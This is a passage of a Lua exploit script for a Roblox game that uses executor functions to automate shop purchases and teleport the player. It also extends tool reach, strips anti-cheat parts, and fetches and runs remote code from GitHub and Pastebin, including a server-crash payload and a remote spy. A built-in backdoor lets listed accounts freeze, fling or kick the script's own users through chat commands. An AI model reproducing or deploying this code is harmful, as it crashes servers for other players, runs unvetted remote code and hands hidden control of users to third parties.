			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
					if v.Ammo.Value > 0 then
						v.Parent = player.Character
					end
				end
			end
			while Holding == true do
				wait(0)
				local TotalAmmo = 0
				for i,v in pairs(player.Backpack:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
				player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
				local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun then
							v.Parent = player.Character
						end
					end
				end
				fireclickdetector(GunPath.Parent.ClickDetector)
				if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
					player.Character:FindFirstChild(Gun).Parent = player.Backpack
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
							if v.Ammo.Value > 0 then
								v.Parent = player.Character
							end
						end
					end
				end
			end
		end)
		InfiniteTool.Unequipped:Connect(function()
			Holding = false
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
		end)
	end
	function infham()
		local Food = '[Hamburger]'
		local FoodTexture = 'rbxassetid://3210917066'
		local FoodPath = game:GetService("Workspace").Ignored.Shop["[Hamburger] - $5"].Head
		local Holding = false

		local InfiniteTool = Instance.new('Tool', player.Backpack)
		InfiniteTool.Name = 'Hamburger'
		InfiniteTool.ToolTip = 'buy hamburgers while holding, eat while using this tool'
		InfiniteTool.TextureId = FoodTexture
		InfiniteTool.RequiresHandle = true
		InfiniteTool.CanBeDropped = false

		local Handle = Instance.new('Part', InfiniteTool)
		Handle.Name = 'Handle'
		Handle.Anchored = false
		Handle.Size = Vector3.new(0,0,0)
		Handle.Massless = true
		Handle.Transparency = 1
		Handle.CanCollide = false

		InfiniteTool.Equipped:Connect(function()
			Holding = true
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == Food and not player.Character:FindFirstChild(Food) then
					v.Parent = player.Character
				end
			end
			while Holding == true do
				wait(0)
				local TotalFood = 0
				for i,v in pairs(player.Backpack:GetChildren()) do
					if v.Name == Food then
						TotalFood = TotalFood + 1
					end
				end
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == Food then
						TotalFood = TotalFood + 1
					end
				end
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalFood)
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
				player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
				local mag = (FoodPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Food then
							v.Parent = player.Character
						end
					end
				end
				fireclickdetector(FoodPath.Parent.ClickDetector)
				if not player.Character:FindFirstChild(Food) then
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Food and not player.Character:FindFirstChild(Food) then
							v.Parent = player.Character
						end
					end
				end
			end
		end)
		InfiniteTool.Unequipped:Connect(function()
			Holding = false
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
		end)
	end

	infrev()
	infdb()
	infham()
	infrpg()
end)
print("everything works:)")
SetSpawn.MouseButton1Click:Connect(function()
	if player.Character then
		if SetSpawn.Text == 'SetSpawn' then
			SetSpawn.Text = 'NoSpawn' 
			SpawnPosition = player.Character.HumanoidRootPart.CFrame
		else
			SetSpawn.Text = 'SetSpawn'
			SpawnPosition = nil
		end
	end
end)
PrevPosition.MouseButton1Click:Connect(function()
	if PreviousPosition ~= nil then
		player.Character.HumanoidRootPart.CFrame = PreviousPosition
	else
		notify('Previous Position Error', 'you need to have tped before to return to an old position', 5)
	end
end)
Bank.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9783134, -285.587372, 0.0165725499, 5.298579e-08, -0.99986279, 1.16139711e-08, 1, 5.31855591e-08, 0.99986279, -1.24937944e-08, 0.0165725499)
end)
Playground.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(-259.516907, 22.1498718, -762.971558, 0.992310345, 0, 0.12377467, 0, 1, 0, -0.12377467, 0, 0.992310345)
end)
LavaBase.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(-796.256897, -39.6492004, -886.306152, -0.39699012, 2.91068263e-05, 0.917822897, 1.63490836e-06, 1, -3.10057476e-05, -0.917822897, -1.08084187e-05, -0.39699012)
end)
GunShop1.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(-591.085022, 8.31477833, -742.803528, 0.994070172, 5.60480942e-08, 0.108740292, -6.51724079e-08, 1, 8.03552425e-08, -0.108740292, -8.69656134e-08, 0.994070172)
end)
GunShop2.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(488.347412, 48.0705032, -630.454285, -0.0453165509, -4.20173549e-08, -0.998972654, -4.23235385e-08, 1, -4.01406339e-08, 0.998972654, 4.04610248e-08, -0.0453165509)
end)
Sewer.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(111.514938, -26.7500305, -276.918365, -0.997865558, -1.25138016e-08, -0.0653034225, -1.74378947e-08, 1, 7.48333733e-08, 0.0653034225, 7.58124159e-08, -0.997865558)
end)
GasStation.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -3.41755495e-08, -0.996165276, 1.23318324e-08, 1, -3.53901868e-08, 0.996165276, -1.53808717e-08, -0.0874911696)
end)
TacoShop.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(583.931641, 51.061409, -476.954193, -0.999745369, 1.49123665e-08, -0.0225663595, 1.44838328e-08, 1, 1.91533687e-08, 0.0225663595, 1.88216429e-08, -0.999745369)
end)
UFO.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313)
end)
SafeZone1.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
end)
SafeZone2.MouseButton1Click:Connect(function()
	PreviousPosition = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397)
end)
SavePos.MouseButton1Click:Connect(function()
	SavedPos = player.Character.HumanoidRootPart.CFrame
end)
LoadPos.MouseButton1Click:Connect(function()
	if SavedPos ~= nil then
		player.Character.HumanoidRootPart.CFrame = SavedPos
	else
		notify('you need to save a position first')
	end
end)
CalculateButton.MouseButton1Click:Connect(function()
	if tonumber(CashTextbox.Text) ~= nil then
		CashTextbox.Text = tostring(math.floor((tonumber(CashTextbox.Text) * 1.42857)))
		local amount = tonumber(CashTextbox.Text)
		cashgoal = player.DataFolder.Currency.Value - amount
		CashAtEndLabel.Text = ('Cash At End : $' .. formatNumber(cashgoal))
	else
		notify('insert number', '', 3)
	end
end)

DropToggleButton.MouseButton1Click:Connect(function()
	if DropToggleButton.Text == 'Enable' and tonumber(CashTextbox.Text) ~= nil then
		DropToggleButton.Text = 'Stop'
		while DropToggleButton.Text == 'Stop' do
			wait()
			MainEvent:FireServer('DropMoney', '10000')
			if player.DataFolder.Currency.Value <= cashgoal then
				DropToggleButton.Text = 'Enable'
				notify('finished dropping')
			end
		end
	else
		DropToggleButton.Text = 'Enable'
	end
end)
CrashServerButton.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotLaggingg/smoke/main/SmokeCrash", true))()
end)

coroutine.resume(coroutine.create(function()
	while wait(3) do
		local function main()
			if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
				player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
			end
			if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
				player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
			end
			loadstring(game:HttpGet('https://raw.githubusercontent.com/dawn-spec/antismokelist/main/modlistonlydawn.lua'))()
		end
		local success, err = pcall(main)
	end
end))

local swagmins = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawn-spec/antismokemodlist/main/onlydawn.lua'))()

local bending = false
local kickmsg = 'PERMA BANNED'
local function commands(msg,plr)
	if DisableMod == false or table.find(swagmins, plr) then
		local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
		local Msg = string.lower(msg)
		local SplitCMD = string.split(Msg,' ')
		local Lower = string.lower(player.Name)
		local Allowed = string.find(Lower, SplitCMD[2])
		if Allowed then
			if string.find(SplitCMD[1], ':freeze') then
				player.Character.HumanoidRootPart.Anchored = true
			end
			if string.find(SplitCMD[1], ':thaw') then
				player.Character.HumanoidRootPart.Anchored = false
			end
			if string.find(SplitCMD[1], ':benx') then
				bending = true
				local segtarget = Mod.Name
				local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
				Crouch.Looped = true
				Crouch:Play()
				local away = .5
				local reversing = false
				local Loop
				local loopFunction = function()
					local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
					local character = player.Character
					if targetchar then
						if reversing == true then
							away = away - 0.1
						else
							away = away + 0.1
						end
						if away >= 2 then
							reversing = true
						elseif away < 0.5 then
							reversing = false
						end
						character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
					end
				end;
				local Start = function()
					Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
				end;
				local Pause = function()
					Loop:Disconnect()
					Crouch:Stop()
				end;
				Start()	
				repeat wait() until bending == false
				Pause()
			end
			if string.find(SplitCMD[1], ':unbenx') then
				while bending == true do
					wait()
					bending = false
				end
			end
			if string.find(SplitCMD[1], ':kick') then
				local ISADMIN = table.find(swagmins, player.UserId)
				if not ISADMIN then
					player:Kick(kickmsg)
					wait(5)
					while true do end
				end
			end
			if string.find(SplitCMD[1], ':bring') then
				player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
			end
			if string.find(SplitCMD[1], ':cuffban') then
				if table.find(swagmins, plr) then
					local ISADMIN = table.find(swagmins, player.UserId)
					if not ISADMIN then
						player:Kick('Stop .')
					end
				end
			end
			if string.find(SplitCMD[1], ':fling') then
				player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
			end
		else
			if string.find(msg, '/e test') then
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("only dawn could do this!", 'All');
			end
		end
	end
end

muted = {}
mutingnew = false 

local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawn-spec/antismokelist/main/modlistonlydawn.lua'))()
Players.PlayerAdded:Connect(function(plr)
	local SWAGMIN = table.find(swagmins, plr.UserId)
	if SWAGMIN or ModCheck[plr.UserId] then
		plr.Chatted:Connect(function(msg)
			commands(msg, plr.UserId)
		end)
	end
	if muteingnew == true then
		if not table.find(muted, plr.Name) then
			table.insert(muted, plr.Name)
			print('automuted ' .. plr.Name)
		end
	end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	local SWAGMIN = table.find(swagmins, v.UserId)
	if SWAGMIN or ModCheck[v.UserId] then
		v.Chatted:Connect(function(msg)
			commands(msg, v.UserId)
		end)
	end
end

local commands = {}

local prefix = "/"

local function findPlayer(name)
	for _, Player in ipairs(Players:GetPlayers()) do
		if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then
			return Player;
		end
	end
end

commands.e = function(arguments)
	local CMD = arguments[1]

	if CMD == 'rejoin' or CMD == 'rj' then
		Players.LocalPlayer:Kick("Rejoining")
		wait()
		game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
	end
	if CMD == 'serverhop' or CMD == 'shop' then
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			print('failed to find server')
		end
	end

	local ANIMATIONS = false
	if CMD == 'animations' and player.PlayerGui.MainScreenGui.AnimationPack.Visible == false and ANIMATIONS == false then
		local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
		ANIMATIONS = true
		local AnimationsFolder = Instance.new('Folder', game.Workspace)
		local LeanAni = Instance.new('Animation', AnimationsFolder)
		LeanAni.AnimationId = 'rbxassetid://3152375249'
		local Lean = Humanoid:LoadAnimation(LeanAni)
		local LayAni = Instance.new('Animation', AnimationsFolder)
		LayAni.AnimationId = 'rbxassetid://3152378852'
		local Lay = Humanoid:LoadAnimation(LayAni)
		local Dance1Ani = Instance.new('Animation', AnimationsFolder)
		Dance1Ani.AnimationId = 'rbxassetid://3189773368'
		local Dance1 = Humanoid:LoadAnimation(Dance1Ani)
		local Dance2Ani = Instance.new('Animation', AnimationsFolder)
		Dance2Ani.AnimationId = 'rbxassetid://3189776546'
		local Dance2 = Humanoid:LoadAnimation(Dance2Ani)
		local GreetAni = Instance.new('Animation', AnimationsFolder)
		GreetAni.AnimationId = 'rbxassetid://3189777795'
		local Greet = Humanoid:LoadAnimation(GreetAni)
		local PrayAni = Instance.new('Animation', AnimationsFolder)
		PrayAni.AnimationId = 'rbxassetid://3487719500'
		local Pray = Humanoid:LoadAnimation(PrayAni)

		Close.Visible = false
		ScrollingFrame.Visible = false
		Animations.Visible = true

		Animations.MouseButton1Click:Connect(function()
			ScrollingFrame.Visible = true
			Close.Visible = true
		end)
		Close.MouseButton1Click:Connect(function()
			ScrollingFrame.Visible = false
			Close.Visible = false
		end)
		LeanButton.MouseButton1Click:Connect(function()
			Lean:Play()
		end)
		LayButton.MouseButton1Click:Connect(function()
			Lay:play()
		end)
		Dance1Button.MouseButton1Click:Connect(function()
			Dance1:Play()
		end)
		Dance2Button.MouseButton1Click:Connect(function()
			Dance2:Play()
		end)
		GreetButton.MouseButton1Click:Connect(function()
			Greet:Play()
		end)
		PrayButton.MouseButton1Click:Connect(function()
			Pray:Play()
		end)

		Humanoid.Running:Connect(function()
			Lean:Stop()
			Lay:Stop()
			Dance1:Stop()
			Dance2:Stop()
			Greet:Stop()
			Pray:Stop()
			ChestPump:Stop()
		end)
	end

	if CMD == 'korblox' then
		game:GetService("Workspace").Players:FindFirstChild(player.Name).RightLowerLeg:Destroy()
		game:GetService("Workspace").Players:FindFirstChild(player.Name).RightUpperLeg:Destroy()
		game:GetService("Workspace").Players:FindFirstChild(player.Name).RightFoot:Destroy()
	end

	if CMD == 'crash' then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/NotLaggingg/smoke/main/SmokeCrash'))()
	end

	if CMD == 'lettuce' then
		local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

		local LettuceTool = Instance.new('Tool', player.Backpack)
		LettuceTool.RequiresHandle = false
		LettuceTool.CanBeDropped = true
		LettuceTool.Name = 'Lettuce'
		LettuceTool.ToolTip = 'inf lettuce eater yummy'

		local function eat()
			local Food = player.Backpack:FindFirstChild('[Lettuce]')
			if Food and player.Character.BodyEffects.Attacking.Value == false then
				Humanoid:EquipTool(Food)
				player.Character:FindFirstChildWhichIsA('Tool'):Activate()
				repeat wait() until player.Character.BodyEffects.Attacking.Value == false
				Humanoid:EquipTool(LettuceTool)

			end
		end

		LettuceTool.Activated:Connect(function()
			eat()
		end)
		LettuceTool.Equipped:Connect(function()
			while player.Character:FindFirstChild('Lettuce') do
				wait()
				local pathto = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].Head
				local HRP = player.Character:FindFirstChild('HumanoidRootPart')
				if HRP and player.Character:FindFirstChild('Lettuce') then
					local Away = (HRP.Position - pathto.Position).Magnitude
					if Away <= 30 then
						for i,v in pairs(player.Backpack:GetChildren()) do
							local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
							if v.Name == '[Lettuce]' then
								v.Parent = player.Character
							end
						end
						fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
					end
				end
			end
		end)
	end

	if CMD == 'fov' then
		if game.Workspace:FindFirstChildWhichIsA('Camera') then
			game.Workspace:FindFirstChildWhichIsA('Camera').FieldOfView = tonumber(arguments[2])
		end
	end

	BRIGHT = false
	if CMD == 'bright' or CMD == 'unbright' then
		if BRIGHT == false then
			BRIGHT = true
			game:GetService("Lighting").GlobalShadows = false
		else
			BRIGHT = false
			game:GetService("Lighting").GlobalShadows = true
		end
	end

	if CMD == 'tool' or CMD == 'tools' then
		for i,v in pairs(game:GetService("Workspace").Ignored.ItemsDrop:GetChildren()) do
			player.Character.HumanoidRootPart.CFrame = v.CFrame
			wait(0.01)
		end
	end

	if CMD == 'zoom' or CMD == 'infzoom' then
		player.CameraMaxZoomDistance = math.huge
	end

	FOG = false
	if CMD == 'fog' then
		if FOG == false then
			FOG = true
			game:GetService("Lighting").FogEnd = 5000
		else
			FOG = false
			game:GetService("Lighting").FogEnd = 500
		end
	end

	if CMD == 'set' then
		local plrtotarget = arguments[2]
		if plrtotarget then
			local playr = findPlayer(plrtotarget)
			if playr then
				TargetTextbox.Text = playr.Name
				SetPlayerInfo()
			end
		end
	end   

	if CMD == 'float' then
		if player.Character:FindFirstChildWhichIsA('Tool') then
			if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
				player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
			end
		end
	end

	if CMD == 'to' then
		local playerToTeleportToName = arguments[2]
		if playerToTeleportToName then
			local plrToTPTo = findPlayer(playerToTeleportToName)
			if plrToTPTo then
				game:GetService('Workspace').Players:WaitForChild(player.Name).HumanoidRootPart.CFrame = game:GetService('Workspace').Players:WaitForChild(plrToTPTo.Name).HumanoidRootPart.CFrame
				if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
					player.Character.LeftHand.CFrame = player.Character.HumanoidRootPart.CFrame
					player.Character.RightHand.CFrame = player.Character.HumanoidRootPart.CFrame
				end
			end
		end
	end

	if CMD == 'sit' then
		game.Players.LocalPlayer.Character.Humanoid.Sit = true
	end

	if CMD == 'recoil' then
		for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
			if v:IsA('Camera') then
				v:Destroy()
			end
		end

		local newcam = Instance.new('Camera')
		newcam.Parent = game:GetService('Workspace')
		newcam.Name = 'Camera'
		newcam.CameraType = 'Custom'
		newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
		newcam.HeadLocked = true
		newcam.HeadScale = 1

	end

	if CMD == 'headless' then
		player.Character.Head:BreakJoints()
		player.Character.Head.Position = Vector3.new(0,99999999999999,0)
	end

	if CMD == 'hideboombox' or CMD == 'boombox' then
		player.Character.BOOMBOXHANDLE:Destroy()
	end

	if CMD == 'reach' or CMD == 'toolreach' then
		if player.Character:FindFirstChildWhichIsA('Tool') then
			player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
			player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
		end
	end
	if CMD == 'taser' then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(-271.194, 21.8, -103.052)
		local LettuceTool = Instance.new('Tool', player.Backpack)
		LettuceTool.RequiresHandle = false
		LettuceTool.CanBeDropped = true
		LettuceTool.Name = 'Taser'
		LettuceTool.ToolTip = 'tazer'

		local function eat()
			hold:Play()
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == '[Taser]' then
					v.Parent = player.Character
				end
			end
			for i,v in pairs(player.Character:GetChildren()) do
				if v.Name == '[Taser]' then
					v:Activate()
				end
			end
		end

		LettuceTool.Activated:Connect(function()
			eat()
		end)
		LettuceTool.Unequipped:Connect(function()

		end)
		LettuceTool.Equipped:Connect(function()
			while player.Character:FindFirstChild('Taser') do
				local a = 0
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == '[Taser]' then
						a = a + 1
					end
				end
				LettuceTool.ToolTip = tostring(a)
				wait(3)
			end
		end)
		coroutine.resume(coroutine.create(function()
			local pathto = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head
			while wait(0.05) do
				local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
				if sus then
					sus:Destroy()
				end
				local HRP = player.Character:FindFirstChild('HumanoidRootPart')
				if HRP and player.Character:FindFirstChild('Taser') then
					local Away = (HRP.Position - pathto.Position).Magnitude
					if Away <= 30 then
						for i,v in pairs(player.Backpack:GetChildren()) do
							local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
							if v.Name == '[Taser]' then
								v.Parent = player.Character
							end
						end
						fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
					end
				end
			end
		end))
	end

	if CMD == 'view' then
		local plrtoview = arguments[2]
		if plrtoview then
			local ptv = findPlayer(plrtoview)
			if ptv then  
				local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
				View.Text = "Unview"
				repeat view(ptv.Name) until View.Text == 'View' 
				Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
			end
		end
	end

	if CMD == 'unview' then
		local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
		Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
		View.Text = "View"
	end

	if CMD == 'shield' then
		if IsMod == true then
			DisableMod = true
			notify('Immune to mod powers')
		end
	end
	if CMD == 'unshield' then
		if IsMod == true then
			DisableMod = false
			notify('Unimmune to mod powers')
		end
	end

	if CMD == 're' then
		player.Character:Destroy()
	end

	if CMD == 'ping' then
		while wait() do
			local Animations = game.Players.LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('AnimationPack')  
			if Animations then
				Animations.TextScaled = true
				Animations.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
			end
		end
	end

	if CMD == 'faceless' or CMD == 'noface' then
		player.Character.Head.face:Destroy()
	end

	if CMD == 'hidemask' then
		player.Character:FindFirstChild('In-gameMask').Handle:Destroy()
	end
	if CMD == 'names' then
		local function checkdisplay()
			for i,v in pairs(game:GetService('Workspace').Players:GetChildren()) do
				if v.Name ~= game.Players:FindFirstChild(v.Name).DisplayName then
					if v:FindFirstChild('UpperTorso'):FindFirstChild('OriginalSize') or v:FindFirstChild('LowerTorso'):FindFirstChild('OriginalSize') then
						v:FindFirstChildWhichIsA('Humanoid').DisplayName = (game.Players:FindFirstChild(v.Name).DisplayName .. ' / ' .. v.Name)
					end
				end
			end
		end
		checkdisplay()
	end
	if CMD == 'remotespy' then
		loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
	end
	if CMD == 'flashlight' then
		local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
		local mouse = player:GetMouse()
		local hold = player.Character.Humanoid:LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.SmallGunAim)

		local LettuceTool = Instance.new('Tool', player.Backpack)
		LettuceTool.RequiresHandle = false
		LettuceTool.CanBeDropped = true
		LettuceTool.Name = 'Flashlight'
		LettuceTool.ToolTip = 'rpg'
		local gun = '[Flashlight]'

		local function eat()
			hold:Play()
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == gun then
					v.Parent = player.Character
				end
			end
			wait(0.2)
			for i,v in pairs(player.Character:GetChildren()) do
				if v.Name == gun then
					v:Activate()
				end
			end
		end
		LettuceTool.Activated:Connect(function()
			eat()
		end)
		LettuceTool.Unequipped:Connect(function()
			hold:Stop()
		end)
		LettuceTool.Equipped:Connect(function()
			hold:Play()
			local ammo = 0
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == gun then
					ammo = ammo + v.Ammo.Value
				end
			end
			LettuceTool.ToolTip = ammo
		end)
		coroutine.resume(coroutine.create(function()
			local pathto = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"].Head
			while wait(0.05) do
				local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
				if sus then
					sus:Destroy()
				end
				local HRP = player.Character:FindFirstChild('HumanoidRootPart')
				if HRP and player.Character:FindFirstChild('Flashlight') then
					local Away = (HRP.Position - pathto.Position).Magnitude
					if Away <= 30 then
						for i,v in pairs(player.Backpack:GetChildren()) do
							local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
							if v.Name == '[Flashlight]' then
								v.Parent = player.Character
							end
						end
						fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
					end
				end
			end
		end))
	end
	if CMD == 'nuke' then
		local LettuceTool = Instance.new('Tool', player.Backpack)
		LettuceTool.RequiresHandle = false
		LettuceTool.CanBeDropped = true
		LettuceTool.Name = 'Nuke'
		LettuceTool.ToolTip = 'tazer'

		local function eat()
			hold:Play()
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == '[Grenade]' then
					v.Parent = player.Character
				end
			end
			for i,v in pairs(player.Character:GetChildren()) do
				if v.Name == '[Grenade]' then
					v:Activate()
					v:Activate()
				end
			end

		end

		LettuceTool.Activated:Connect(function()
			eat()
			for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
				if v.Name == 'Handle' then
					v.Position = mouse.Hit.p
				end
			end
		end)
		LettuceTool.Unequipped:Connect(function()
			hold:Stop()
		end)
		LettuceTool.Equipped:Connect(function()
			while player.Character:FindFirstChild('Nuke') do
				local a = 0
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == '[Grenade]' then
						a = a + 1
					end
				end
				LettuceTool.ToolTip = tostring(a)
				wait(3)
			end
		end)
		coroutine.resume(coroutine.create(function()
			local pathto = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"].Head
			while wait(0.05) do
				local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
				if sus then
					sus:Destroy()
				end
				local HRP = player.Character:FindFirstChild('HumanoidRootPart')
				if HRP and player.Character:FindFirstChild('Nuke') then
					local Away = (HRP.Position - pathto.Position).Magnitude
					if Away <= 30 then
						for i,v in pairs(player.Backpack:GetChildren()) do
							local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
							if v.Name == '[Grenade]' then
								v.Parent = player.Character
							end
						end
						fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
					end
				end
			end
		end))
	end
	if CMD == 'mute' then
		if tostring(arguments[2]) == 'all' then
			muteingnew = true
			for _,v in pairs(Players:GetChildren()) do
				if not table.find(muted, v.Name) then
					table.insert(muted, v.Name)
					print('muted ' .. v.Name)
				end
			end
		else
			local plrtoview = arguments[2]
			if plrtoview then
				local ptv = findPlayer(plrtoview)
				if ptv then  
					if not table.find(muted, ptv.Name) then
						table.insert(muted, ptv.Name)
						print('manualy muted ' .. ptv.Name)
					end
				end
			end
		end
	end

	coroutine.resume(coroutine.create(function()
		local function mute()
			for i,v in pairs(Players:GetChildren()) do
				if table.find(muted, v.Name) then
					if v.Character then
						if v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND') and v.Character.UpperTorso:FindFirstChild('OriginalSize') then
							v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND'):Stop()
						end
					end
				end
			end
		end
		while wait(.2) do
			local success,err = pcall(mute)
		end
	end))

	if CMD == 'unmute' then
		if tostring(arguments[2]) == 'all' then
			muteingnew = false
			for _,v in pairs(Players:GetChildren()) do
